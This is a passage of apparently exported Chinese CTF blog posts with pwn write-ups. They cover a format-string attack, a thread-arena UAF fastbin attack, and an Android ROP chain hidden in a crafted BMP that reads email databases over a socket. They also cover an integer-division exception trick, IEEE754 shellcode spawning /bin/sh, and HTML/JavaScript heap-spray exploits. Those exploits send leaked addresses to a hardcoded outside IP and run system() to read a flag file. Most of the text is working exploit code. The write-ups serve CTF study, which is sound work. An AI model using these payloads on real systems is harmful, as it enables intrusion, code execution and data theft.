flag_str = flag_str &gt;&gt; 8   i = i + 1data = sorted(data.items(), key=lambda d:d[1])pay = &#x27;&#x27;prev = 9for x in data:   print x[0],x[1]   pay += &#x27;%&#x27; + str(x[1]-prev) + &#x27;c%&#x27; + str(18+x[0]) + &#x27;$hhn&#x27;   prev = x[1]pay = pay.ljust(47,&#x27;b&#x27;)pay += p64(name_addr - 0xB10)pay += p64(name_addr - 0xB0F)pay += &#x27;flag\\x00&#x27; #我们要读取的文件payload = &#x27;GET /index.html HTTP/1.1\\r\\n&#x27;payload += &#x27;Referer: &#123;&#125;\\r\\n\\r\\n&#x27;.format(pay)sh.send(payload)sh.interactive()","categories":["CTF"],"tags":["格式化字符串漏洞"]},{"title":"线程PWN之gkctf2020 GirlFriendSimulator","url":"/2020/07/25/GKCTF2020_GirlFriendSimulator/","content":"首先，检查一下程序的保护机制\n\n\n然后我们用IDA分析一下，一个多线程程序\n\n\n在线程里的delete功能，存在UAF\n\n\n但是由于add功能次数限制，无法在线程里完成这个UAF的利用\n\n\n在glibc中，线程有自己的arena，但是arena的个数是有限的，一般跟处理器核心个数有关，假如线程个数超过arena总个数，并且执行线程都在使用，那么该怎么办呢。Glibc会遍历所有的arena，首先是从主线程的main_arena开始，尝试lock该arena，如果成功lock，那么就把这个arena给线程使用。\n为了测试有多少个arena，我们写如下脚本\nfor i in range(num - 1):   add(0x10,&#x27;a&#x27;*0x10)   delete()   add(0x10,&#x27;a&#x27;*0x8)   show()   sh.recvuntil(&#x27;a&#x27;*0x8)   heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))   print &#x27;heap_addr=&#x27;,hex(heap_addr)   nextThread()\n\n\n\n我们看到，第9个，其堆地址跟main_arena管理的堆地址相似，可以推断出，该线程使用了main_arena。因此，我们在第9个线程里，利用delete功能制造UAF，然后，在main函数后面的流程中，\n\n\n可以直接编辑最后一个线程创建的堆，也就是可以把fake_chunk链接到bin上，从而利用fastbin attack。\n#coding:utf8from pwn import *#sh = process(&#x27;./girlfriend_simulator&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25877)libc = ELF(&#x27;./libc-2.23.so&#x27;)num = 9sh.sendlineafter(&#x27;How much girlfriend you want ?&#x27;,str(num))def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size?&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content)def delete():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)def show():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)def nextThread():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;5&#x27;)for i in range(num - 1):   add(0x10,&#x27;a&#x27;*0x10)   delete()   add(0x10,&#x27;a&#x27;*0x8)   show()   sh.recvuntil(&#x27;a&#x27;*0x8)   heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))   print &#x27;heap_addr=&#x27;,hex(heap_addr)   nextThread()#这个线程将使用主线程的main_arena，由此在主线程的堆里制造一个UAFadd(0x60,&#x27;a&#x27;*0x60)delete()nextThread()sh.recvuntil(&#x27;wife:0x&#x27;)libc_base = int(sh.recv(12),16) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]malloc_hook_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]one_gadget_addr = libc_base + 0x4526arealloc_addr = libc_base + libc.sym[&#x27;realloc&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;realloc_addr=&#x27;,hex(realloc_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)sh.sendlineafter(&#x27;say something to impress your girlfriend&#x27;,p64(malloc_hook_addr - 0x23))sh.sendlineafter(&#x27;your girlfriend is moved by your words&#x27;,&#x27;I love you&#x27;)#改写malloc_hookpayload = &#x27;\\x00&#x27;*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x2)sh.sendlineafter(&#x27;Questionnaire&#x27;,payload)sh.interactive()","categories":["CTF"],"tags":["UAF","线程堆","fastbin"]},{"title":"GeekCon2023 AVSS EmailThief","url":"/2023/10/24/GeekCon2023-AVSS-EmailThief/","content":"patch在系统的Email软件中加入了一个so库，当Email中存在image&#x2F;bmp图片时会调用so库中的函数进行图片解析，其中memcpy存在溢出\n\n可以溢出覆盖pages变量和watermark函数指针，当代码执行到后面时就可以调用到watermark函数，并且可以控制参数0和1。由于开启了地址随机化，通过观察发现系统中的boot.oat文件有RX代码区，并且每次重启或者开机其地址都不变，因此可以利用其中的gadgets。\nEXP编写过程中需要寻找合适的gadgets进行构造，发现到最后execve总是不能成功执行，最后该用了ORW的方式读取数据，先构造ROP调用getdents获得目录结构，然后调用ORW读取文件，pdf文件在&#x2F;data&#x2F;data&#x2F;com.android.email&#x2F;databases&#x2F;xx_db_att文件夹下。\n最终演示发现EXP打不通，最后才知道是boot.oat有差异，boot.oat会在数据清除后重新生成，因此每个手机的boot.oat不一样，EXP仅仅适用于这一个手机\n#coding:utf8from pwn import *#mov sb, r0 ; add r6, pc ; ldr.w lr, [sb, #0x114] ; mov r1, r8 ; movw r0, #0x34e ; blx lrmov_sb = 0x7374472e#mov sp, sb ; add r6, pc ; ldr.w r0, [pc, #0x88] ; ldr.w lr, [sb, #0x10c] ; movs r5, #2 ; adds r1, r5, #0 ; mov r2, sl ; blx lrmov_sp_sb = 0x731b14bepop_r012 = 0x72dd5540pop_r0123 = 0x72886064pop_r23 = 0x72b85994pop_r2 = 0x72a0ad16pop_r7 = 0x728bb89cpop_r1_r2 = 0x73440be4#str r0, [r1, #0x50] ; adds r0, r6, #0 ; add sp, #0x10 ; pop &#123;r5, r6, r7, pc&#125;str_r0_r1 = 0x73c5e440#ldr r0, [r1, #4] ; lsls r2, r0, #1 ; pop &#123;r1, r5, pc&#125;ldr_r0_r1 = 0x72abaa2cpop_r1 = 0x72c11b38pop_r0 = 0x72b02c50pop_r0_r1 = 0x7281b700#svc #0x94 ; lsls r6, r1, #1 ; pop &#123;r3, r7, pc&#125;svc = 0x72b83a5c#add r0, sp, #0x1a0 ; strb r2, [r3, #1] ; pop &#123;r3, r5, r7, pc&#125;add_r0_sp = 0x728bcaa0#add r1, sp, #0x244 ; movs r4, r3 ; pop &#123;r3, r7, pc&#125;add_r1_sp = 0x72854994#add sp, #0x20 ; pop &#123;r5, r6, r7, pc&#125;add_sp_0x20 = 0x7280889ebss = 0x73dd9000bmp = &#x27;BM&#x27;bmp += p32(0) #bfSizebmp += p32(0)bmp += p32(0x20)bmp += p32(0) #biSizebmp += p32(0x20) #biWidthbmp += p32(0x20) #biHeightbmp += p16(1) #biPlanesbmp += p16(24) #biBitCountbmp += &#x27;DD&#x27;rop = p32(bss) + p32(pop_r0+1) + p32(0x1D090002)rop += p32(str_r0_r1+1) + &#x27;a&#x27;*0x1Crop += p32(pop_r1+1) + p32(bss+0x4) + p32(pop_r0+1) + p32(0x200AA8C0)rop += p32(str_r0_r1+1) + &#x27;b&#x27;*0x1Crop += p32(pop_r012+1) + p32(2) + p32(1) + p32(0) #R0~2rop += p32(pop_r7+1) + p32(0x119) + p32(svc+1) #socket(2,1,0)rop += p32(0) + p32(0x11B)rop += p32(pop_r1+1) + p32(bss+0x8) + p32(str_r0_r1+1) + &#x27;c&#x27;*0x18 + p32(0x11B)rop += p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x50) + p32(0)rop += p32(pop_r2+1) + p32(0x10) + p32(svc+1) #connect(fd,&amp;addr,0x10)rop += &#x27;d&#x27;*0x8rop += p32(add_r1_sp+1) + &#x27;d&#x27;*0x4 + p32(0x142)rop += p32(pop_r0+1) + p32(0xFFFFFF9C) + p32(pop_r23+1) + p32(0xA4000) + p32(0)rop += p32(svc+1) #openat(0,&quot;file&quot;,0,0)rop += &#x27;e&#x27;*0x4 + p32(0xd9)rop += p32(add_sp_0x20+1)print(hex(len(rop)))payload = rop.ljust(0x10c,&#x27;a&#x27;)payload += p32(pop_r1+1)payload += &#x27;a&#x27;*0x4payload += p32(mov_sp_sb+1)payload += &#x27;b&#x27;*0x14&#x27;&#x27;&#x27;payload += p32(0x3)rop2 = p32(pop_r1_r2+1) + p32(bss+0x60) + p32(0x1000) + p32(svc+1) #readrop2 += &#x27;f&#x27;*0x4 + p32(0x4) + p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x1000) + p32(svc+1) #write&#x27;&#x27;&#x27;payload += p32(0xd9)#rop2 = p32(pop_r1+1) + p32(bss+0xc) + p32(str_r0_r1+1) + &#x27;c&#x27;*0x18 + p32(0xd9)rop2 = p32(pop_r1_r2+1) + p32(bss+0x60) + p32(0x1000) + p32(svc+1) #getdentsrop2 += &#x27;f&#x27;*0x4 + p32(0x4) + p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x50) + p32(svc+1) #write&#x27;&#x27;&#x27;rop2 += &#x27;f&#x27;*0x4 + p32(0xd9)rop2 += p32(pop_r1+1) + p32(bss+0x58) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x1000) + p32(svc+1) #getdentsrop2 += &#x27;f&#x27;*0x4 + p32(0x4) + p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x50) + p32(svc+1) #writerop2 += &#x27;f&#x27;*0x4 + p32(0xd9)rop2 += p32(pop_r1+1) + p32(bss+0x58) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x1000) + p32(svc+1) #getdentsrop2 += &#x27;f&#x27;*0x4 + p32(0x4) + p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x50) + p32(svc+1) #writerop2 += &#x27;f&#x27;*0x4 + p32(0xd9)rop2 += p32(pop_r1+1) + p32(bss+0x58) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x1000) + p32(svc+1) #getdentsrop2 += &#x27;f&#x27;*0x4 + p32(0x4) + p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x50) + p32(svc+1) #writerop2 += &#x27;f&#x27;*0x4 + p32(0xd9)rop2 += p32(pop_r1+1) + p32(bss+0x58) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x1000) + p32(svc+1) #getdentsrop2 += &#x27;f&#x27;*0x4 + p32(0x4) + p32(pop_r1+1) + p32(bss+0x54) + p32(ldr_r0_r1+1) + p32(bss+0x60) + p32(0)rop2 += p32(pop_r2+1) + p32(0x50) + p32(svc+1) #write&#x27;&#x27;&#x27;payload += rop2print(hex(len(payload)))payload = payload.ljust(0x318,&#x27;c&#x27;)payload += &#x27;/data/data/com.android.email/databases\\x00&#x27;#payload += &#x27;/sdcard/1.bmp\\x00&#x27;#payload += &#x27;/sdcard/\\x00&#x27;payload = payload.ljust(0x3*0x10*0x20,&#x27;a&#x27;)bmp += payloadbmp += p32(0) #image_ptrbmp += p32(0) #pagesbmp += &#x27;bbbb&#x27; #footprintbmp += p32(mov_sb+1) #watermarkf = open(&#x27;1.bmp&#x27;,&#x27;wb&#x27;)f.write(bmp)f.close()","categories":["CTF","安全研究"],"tags":["android","aarch64","selinux","Linux Kernel"]},{"title":"HITCON_2018_Hackergame_2018_calc(利用整数除法抛出异常)","url":"/2020/07/24/HITCON_2018_Hackergame_2018_calc/","content":"用IDA分析一下，程序注册了异常信号处理函数。\n\n\n该函数可以执行命令\n\n\n现在，只要想办法触发异常即可。\n\n\n程序中过滤了除0异常，其实还可以利用-0x80000000&#x2F;-1来触发异常。\n我们可以做个试验\n#include &lt;stdio.h&gt;int main() &#123;   int a,b;   scanf(&quot;%d%d&quot;,&amp;a,&amp;b);   int c = a/b;   printf(&quot;%d\\n&quot;,c);&#125;\n\n运行程序，然后测试，发现程序崩溃。\n\n\n因此，我们可以利用这种方法触发异常。\n#coding:utf8from pwn import *sh = remote(&#x27;node3.buuoj.cn&#x27;,26644)sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;,&#x27;-2147483648/-1&#x27;)sh.sendlineafter(&#x27;examine:&#x27;,&#x27;vim&#x27;)sh.sendline(&#x27;:!sh&#x27;)sh.interactive()","categories":["CTF"],"tags":["整数溢出","异常"]},{"title":"IEE754_shellcode","url":"/2020/06/11/IEE754-shellcode/","content":"fixedpoint_plaid_2016的一题，留着备用https://github.com/ispoleet/ctf-writeups/tree/master/plaid_ctf_2016/fixedpoint\n#coding:utf8from pwn import *import struct #target = process(&#x27;./fixedpoint_plaid_2016&#x27;)target = remote(&#x27;node3.buuoj.cn&#x27;,26804) def get_int(s):  a = struct.unpack(&#x27;&lt;f&#x27;, s)[0]* 1337  return struct.unpack(&#x27;I&#x27;, struct.pack(&#x27;&lt;I&#x27;, a))[0]  print &quot;Sending IEEE754 shellcode...&quot;sleep(1) for i in range(3):  target.sendline(str(get_int(&#x27;\\x00\\x00\\x00\\x00&#x27;))) target.sendline(str(get_int(&#x27;\\x99\\x89\\xc3\\x47&#x27;)))     # mov ebx, eaxtarget.sendline(str(get_int(&#x27;\\x41\\x44\\x44\\x44&#x27;)))     # nop/align for c in &#x27;/bin/sh\\x00&#x27;:  target.sendline(str(get_int(&#x27;\\x99\\xb0&#x27;+c+&#x27;\\x47&#x27;)))  # mov al, c  target.sendline(str(get_int(&#x27;\\x57\\x89\\x03\\x43&#x27;)))   # mov [ebx], eax; inc ebx for i in range(8):  target.sendline(str(get_int(&#x27;\\x57\\x4b\\x41\\x47&#x27;)))   # dec ebx target.sendline(str(get_int(&#x27;\\x99\\x31\\xc0\\x47&#x27;)))     # xor eax, eaxtarget.sendline(str(get_int(&#x27;\\x99\\x31\\xc9\\x47&#x27;)))     # xor ecx, ecxtarget.sendline(str(get_int(&#x27;\\x99\\x31\\xd2\\x47&#x27;)))     # xor edx, edxtarget.sendline(str(get_int(&#x27;\\x99\\xb0\\x0b\\x47&#x27;)))     # mov al, 0xbtarget.sendline(str(get_int(&#x27;\\x99\\xcd\\x80\\x47&#x27;)))     # int 0x80raw_input()target.sendline(&#x27;c&#x27;) target.interactive()\n","categories":["CTF"],"tags":["shellcode"]},{"title":"GeekCon2024 AVSS Writeup","url":"/2024/10/22/GeekCon2024_AVSS_WriteUP/","content":"AllocatorAndroid 4先申请一些堆，间接释放后，再申请一些堆，由于UAF，此时堆指针数组里肯定有两个一样的指针，为了找出哪些数组下标里存的指针一样，可以通过show泄漏堆中的数据进行两两比较，建立一个map。然后利用UAF把其中一个下标对应的指针delete进行释放，那么此时可以通过另一个下标对释放后的堆进行操作。这里我们可以堆喷FileIO对象，堆喷成功后可以通过show泄漏so库的地址，然后伪造vtable后进行触发即可。\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        var xhr = new XMLHttpRequest();        function stringToHex(str) &#123;           var val=&quot;&quot;;           for(var i = 0; i &lt; str.length; i++)&#123;              val += str.charCodeAt(i).toString(16);           &#125;           return val;       &#125;       function hexToString(hex) &#123;         var str = &#x27;&#x27;;         for (var i = 0; i &lt; hex.length; i += 2) &#123;            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));         &#125;         return str;       &#125;       var sleep = function(time) &#123;         var startTime = new Date().getTime() + parseInt(time, 10);          while(new Date().getTime() &lt; startTime) &#123;&#125;       &#125;;       function log(info) &#123;          xhr.open(&#x27;GET&#x27;, &#x27;http://47.109.49.88/&#x27; + info, true);          xhr.send();       &#125;         function add(index,size,key) &#123;            window._jsbridge.add(index,key,size);            //sleep(1000);       &#125;       function edit(index,content) &#123;            window._jsbridge.edit(index,stringToHex(content));            //sleep(500);       &#125;       function edit_hex(index,content) &#123;            window._jsbridge.edit(index,content);            //sleep(500);       &#125;       function show(index,size) &#123;            ans = window._jsbridge.show(index,size);            return ans;       &#125;               function del(index) &#123;            window._jsbridge.delete(index);            //sleep(500);       &#125;       function openfile(filename,mode) &#123;            window._jsbridge.openfile(filename,mode);            //sleep(500);       &#125;       function writefile(content) &#123;            window._jsbridge.writefile(stringToHex(content));            //sleep(500);       &#125;       function writefile_hex(content) &#123;            window._jsbridge.writefile(content);            //sleep(500);       &#125;       function readfile() &#123;            ans = window._jsbridge.readfile();            //sleep(500);            return ans;       &#125;       function closefile() &#123;            window._jsbridge.closefile();            //sleep(500);       &#125;       function getPadding(size,c) &#123;            var ans = &#x27;&#x27;;            for (var i=0;i&lt;size;i++) &#123;               ans += c;            &#125;            return ans;       &#125;       var heap_addr=null;       var elf_base=null;         function p32(value) &#123;          var t = value.toString(16);          while (t.length != 8) &#123;             t = &#x27;0&#x27; + t;          &#125;          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);          //alert(ans);          return ans;       &#125;       function u32(s) &#123;         hex = stringToHex(s);         if (hex.indexOf(&#x27;0x&#x27;) === 0) &#123;            hex = hex.slice(2);         &#125;         if (hex.length % 2 !== 0) &#123;            hex = &#x27;0&#x27; + hex;         &#125;         var bytes = [];         for (var i = 0; i &lt; hex.length; i += 2) &#123;            bytes.push(hex.substr(i, 2));         &#125;         bytes.reverse();         var littleEndianHex = bytes.join(&#x27;&#x27;);         return parseInt(littleEndianHex, 16);      &#125;       //将系统中已有的0x100的碎片尽可能申请掉       for (var i=0;i&lt;10;i++) &#123;         add(48,0x1000,&quot;key100&quot;);       &#125;       add(49,0x1000,&quot;key100&quot;);       //将系统中已有的0x10的碎片尽可能申请掉       for (var i=0;i&lt;200;i++) &#123;         add(0,0x4,&quot;key10&quot;);       &#125;       //添加一些0x90的堆       for (var i=0;i&lt;48;i++) &#123;         add(i,0x90,&quot;key&quot; + i);         edit(i,getPadding(0x90,String.fromCharCode(48+i)))       &#125;       //间接的释放一些0x90的堆       for (var i=0;i&lt;48;i+=2) &#123;         del(i);       &#125;       //重新申请0x90的堆回来       for (var i=1;i&lt;48;i+=2) &#123;         add(i,0x90,&quot;key&quot; + i);       &#125;       //释放一个0x100的堆，用于给一些中间变量内存申请       del(48);       //查找堆块，找出具有相同堆指针的下标       map = &#123;&#125;;       //寻找指针一样的下标       for (var i=0;i&lt;48;i+=2) &#123;         var x = stringToHex(getPadding(0x5,String.fromCharCode(48+i)));         for (var j=1;j&lt;48;j+=2) &#123;            var y = show(j,0x8);            //log(&quot;map &quot; + x  + &quot;=&quot; + y);            if (y.indexOf(x) != -1) &#123;               map[i] = j;               log(&quot;map&quot; + i  + &quot;=&quot; + j);               break;            &#125;         &#125;       &#125;       //利用UAF释放，可以在具有相同指针的另一个下标进行UAF操作       for (var i=0;i&lt;0x48;i+=2) &#123;            if (map[i]) &#123;               del(i);            &#125;       &#125;       log(&quot;spray done&quot;);       //对gfileio结构体进行堆喷，让其落在UAF的堆中       //这里不断的openfile，然后查找内存，如果找到部分字符串ta/com.avss则堆喷成功       //注意show的参数大小size也会申请内存，会造成影响，因此采用4，影响较小       var found = -1;       var mode = -1;       for (var i=0;i&lt;200;i++) &#123;         openfile(&quot;for_leak&quot;,0);         //检查是否成功堆喷站位         for (var j in map) &#123;            var y = show(map[j],0x9);            if (hexToString(y).indexOf(&quot;ta/com.a&quot;) === 0) &#123;               //log(&quot;success0&quot;);               found = map[j];               mode = 0;               break;            &#125; else if (y.indexOf(&#x27;dc&#x27;) != -1) &#123;               //log(&quot;success1&quot;);               found = map[j];               mode = 1;               break;            &#125;         &#125;         if (found != -1) &#123;            break;         &#125;       &#125;       var found_show = -1;       for (var j in map) &#123;            var y = show(map[j],0x9);            if (y.indexOf(&quot;100000001300000073&quot;) != -1) &#123;               found_show = map[j];               break;            &#125;       &#125;       log(&quot;found=&quot; + found);       //log(&quot;show=&quot; + found_show);       var gfileio_off;       if (mode == 0) &#123;         gfileio_off = 0x38;       &#125; else &#123;         gfileio_off = 0x8;       &#125;   //成功堆喷gfileio，接下来可以利用UAF进行泄漏和代码执行了   var leak = hexToString(show(found, 0x90));   var so_base = u32(leak.substring(gfileio_off, gfileio_off+4)) - 0x19bdc;   var gfileio_ptr_addr =  so_base + 0x1C7C4;   var fake_vtable = so_base + 0x19CD4;   var bss = so_base + 0x1c7cc;   var leak_libc = hexToString(show(found_show, 16));   //var libc_base = u32(leak_libc.substring(12, 16)) - 0x4d100;   var libc_base = 0xb6e92000;   var system_addr = libc_base + 0x000246A0;   var arg1 = 0x61616161;   var arg2 = 0x62626262;   var msg = &quot;so_base=&quot; + so_base.toString(16);   msg += &quot;&amp;libc_base=&quot; + libc_base.toString(16);   msg += &quot;&amp;system_addr=&quot; + system_addr.toString(16);   log(msg);   var payload = stringToHex(getPadding(gfileio_off,&quot;a&quot;));   payload += p32(fake_vtable) + stringToHex(getPadding(0x18 - 4,&quot;a&quot;));   payload += p32(system_addr+1) + stringToHex(&quot;;log -t FLAG `cat /data/data/com.avss.testallocator/files/flag`;&quot;);   edit_hex(found,payload);   log(&quot;edit done&quot;);   //sleep(15000);   var payload2 = stringToHex(getPadding(0xC,&quot;b&quot;));   payload2 += p32(gfileio_ptr_addr)   writefile_hex(payload2);     &lt;/script&gt;&lt;/head&gt;  &lt;body&gt;  &lt;div&gt;haivk&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\nAndroid 8首先申请一些堆然后间接释放，堆喷fopen时创建的FILE结构体，此时间接释放的这些堆中肯定存在至少一个被堆喷为FILE结构体，利用UAF继续将这些间隔的堆释放然后重新申请，通过show泄漏堆中残留的libc指针；接下来的做法跟Android 4类似，想要找到具有同样指针的数组下标，但是由于0x18的堆太小，申请回来后内部的数据基本不是原来的（堆管理器破坏了原来的数据），因此不能直接show来获得内容然后比较。可以利用show的8字节溢出来泄漏超出8字节的内容。然后比较每个堆超出8字节的内容，如果一样则说明这两个堆指针是一样的。找到下标后进行堆喷，然后利用UAF伪造vtable并触发。\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        var xhr = new XMLHttpRequest();        function stringToHex(str) &#123;           var val=&quot;&quot;;           for(var i = 0; i &lt; str.length; i++)&#123;              val += str.charCodeAt(i).toString(16).padStart(2,&#x27;0&#x27;);           &#125;           return val;       &#125;       function hexToString(hex) &#123;         var str = &#x27;&#x27;;         for (var i = 0; i &lt; hex.length; i += 2) &#123;            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));         &#125;         return str;       &#125;       var sleep = function(time) &#123;         var startTime = new Date().getTime() + parseInt(time, 10);          while(new Date().getTime() &lt; startTime) &#123;&#125;       &#125;;       function log(info) &#123;          xhr.open(&#x27;GET&#x27;, &#x27;http://47.109.49.88/&#x27; + info, true);          xhr.send();       &#125;         function add(index,size,key) &#123;            window._jsbridge.add(index,key,size);            //sleep(1000);       &#125;       function edit(index,content) &#123;            window._jsbridge.edit(index,stringToHex(content));            //sleep(500);       &#125;       function edit_hex(index,content) &#123;            window._jsbridge.edit(index,content);            //sleep(500);       &#125;       function show(index,size) &#123;            ans = window._jsbridge.show(index,size);            return ans;       &#125;               function del(index) &#123;            window._jsbridge.delete(index);            //sleep(500);       &#125;       function openfile(filename,mode) &#123;            window._jsbridge.openfile(filename,mode);            //sleep(500);       &#125;       function writefile(content) &#123;            window._jsbridge.writefile(stringToHex(content));            //sleep(500);       &#125;       function writefile_hex(content) &#123;            window._jsbridge.writefile(content);            //sleep(500);       &#125;       function readfile() &#123;            ans = window._jsbridge.readfile();            //sleep(500);            return ans;       &#125;       function closefile() &#123;            window._jsbridge.closefile();            //sleep(500);       &#125;       function getPadding(size,c) &#123;            var ans = &#x27;&#x27;;            for (var i=0;i&lt;size;i++) &#123;               ans += c;            &#125;            return ans;       &#125;       var heap_addr=null;       var elf_base=null;         function p32(value) &#123;          var t = value.toString(16);          while (t.length != 8) &#123;             t = &#x27;0&#x27; + t;          &#125;          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);          //alert(ans);          return ans;       &#125;       function p64(value) &#123;          var t = value.toString(16);          while (t.length != 16) &#123;             t = &#x27;0&#x27; + t;          &#125;          var ans = t.substr(14,2) + t.substr(12,2) + t.substr(10,2) + t.substr(8,2) + t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);          //alert(ans);          return ans;       &#125;       function u32(s) &#123;         hex = stringToHex(s);         if (hex.indexOf(&#x27;0x&#x27;) === 0) &#123;            hex = hex.slice(2);         &#125;         if (hex.length % 2 !== 0) &#123;            hex = &#x27;0&#x27; + hex;         &#125;         var bytes = [];         for (var i = 0; i &lt; hex.length; i += 2) &#123;            bytes.push(hex.substr(i, 2));         &#125;         bytes.reverse();         var littleEndianHex = bytes.join(&#x27;&#x27;);         return parseInt(littleEndianHex, 16);      &#125;      //泄漏libc      for (var i=0;i&lt;10;i++) &#123;         add(i,0xa6f-0x8,&quot;leak&quot;);       &#125;       for (var i=0;i&lt;10;i+=2) &#123;         del(i);       &#125;       //fopen时申请的堆大小为0xa6f       for (var i=0;i&lt;100;i++) &#123;         openfile(&quot;libc_leak&quot;,1);       &#125;       for (var i=0;i&lt;10;i+=2) &#123;         del(i);       &#125;       var libc_base = -1;       var system_addr = -1;       var heap_addr = -1;       var leak;       for (var i=0;i&lt;50;i++) &#123;         add(49,0xa6f-0x8,&quot;leak&quot;);         x = show(49,0x60);         if (x.substring(0x90,0x92) == &quot;c0&quot; &amp;&amp; x.substring(0xa0,0xa2) == &quot;c8&quot;) &#123;            leak = hexToString(x);            libc_base = u32(leak.substring(0x48, 0x50)) - 0x731c0;            system_addr = libc_base + 0x64144;            heap_addr = u32(leak.substring(0x8, 0x10));            log(&quot;libc_base=&quot; + libc_base.toString(16) + &quot;&amp;system_addr=&quot; + system_addr.toString(16) + &quot;&amp;heap_addr=&quot; + heap_addr.toString(16));            break;         &#125;                &#125;              //将系统中已有的0x18的碎片尽可能申请掉       for (var i=0;i&lt;200;i++) &#123;         add(0,0x18,&quot;alloc&quot;);       &#125;       //记录每个堆溢出的8字节内容       overflow_map = &#123;&#125;;       //记录每个堆的前一个堆是哪个       prev_map = &#123;&#125;;       prev_map_values = [];       //添加一些0x18的堆       for (var i=0;i&lt;32;i++) &#123;         add(i,0x18,&quot;key&quot; + i);         edit(i,getPadding(0x18,String.fromCharCode(48+i)))       &#125;       //记录每个堆块的超出8字节的内容       for (var i=0;i&lt;32;i++) &#123;         var y = show(i,0x20).substring(0x30,0x40);         //搜索keyxxxx         overflow_map[i] = y;         var k = hexToString(y);         if (k.indexOf(&quot;key&quot;) == 0) &#123;            var n = parseInt(k.substring(3));            log(&quot;prev_map&quot; + n  + &quot;=&quot; + i);            prev_map[n] = i;            prev_map_values.push(i);         &#125;       &#125;       //释放一些0x18的堆       for (var i=0;i&lt;32;i++) &#123;         //不要释放作为某个堆的前一个堆         if (prev_map_values.indexOf(i) != -1)            continue;         del(i);       &#125;       //重新申请0x18的堆回来       for (var i=32;i&lt;49;i++) &#123;         add(i,0x18,&quot;key&quot; + i);       &#125;       //查找堆块，找出具有相同堆指针的下标       map = &#123;&#125;;       //寻找指针一样的下标       for (var i=0;i&lt;32;i++) &#123;         if (prev_map_values.indexOf(i) != -1)            continue;         var x = overflow_map[i];         for (var j=32;j&lt;49;j++) &#123;            var y = show(j,0x20);            //log(&quot;map &quot; + x  + &quot;=&quot; + y);            if (y.substring(0x30,0x40) == x) &#123;               map[i] = j;               log(&quot;map&quot; + i  + &quot;=&quot; + j);               break;            &#125;         &#125;       &#125;       //利用UAF释放，可以在具有相同指针的另一个下标进行UAF操作       for (var i=0;i&lt;32;i++) &#123;            if (map[i]) &#123;               del(i);            &#125;       &#125;       log(&quot;spray done&quot;);       //对gfileio结构体进行堆喷，让其落在UAF的堆中       //这里不断的openfile，然后查找内存，如果找到部分字符串ta/com.avss则堆喷成功       //注意show的参数大小size也会申请内存，会造成影响，因此采用4，影响较小       var found = -1;       var mode = -1;       var pre = -1;       for (var i=0;i&lt;300;i++) &#123;         openfile(&quot;spray_gfileio&quot;,0);         //检查是否成功堆喷站位         for (var j in map) &#123;            if (prev_map[j]) &#123;               //log(&quot;prev_map&quot; + j  + &quot;=&quot; + prev_map[j]);               var y = show(prev_map[j],0x20);               if (y.substring(0x30,0x32) == &quot;08&quot; &amp;&amp; y.substring(0x33,0x34) == &quot;3&quot;) &#123;                  found = map[j];                  pre = prev_map[j];                  break;               &#125;            &#125;         &#125;         if (found != -1) &#123;            break;         &#125;       &#125;       log(&quot;found=&quot; + found + &quot;&amp;pre=&quot; + pre);   //成功堆喷gfileio，接下来可以利用UAF进行泄漏和代码执行了   leak = hexToString(show(pre, 0x20));   var so_base = u32(leak.substring(0x18, 0x20)) - 0x34308;   //ldp x1, x0, [x0, #8] ; br x1   var gadget_addr = libc_base + 0x66078;   edit_hex(49,stringToHex(getPadding(0x18,&quot;a&quot;)) + p64(gadget_addr) + stringToHex(&quot;log -t FLAG `cat /data/data/com.avss.testallocator/files/flag`&quot;));   var fake_vtable = heap_addr;   var msg = &quot;so_base=&quot; + so_base.toString(16);   log(msg);   var payload = 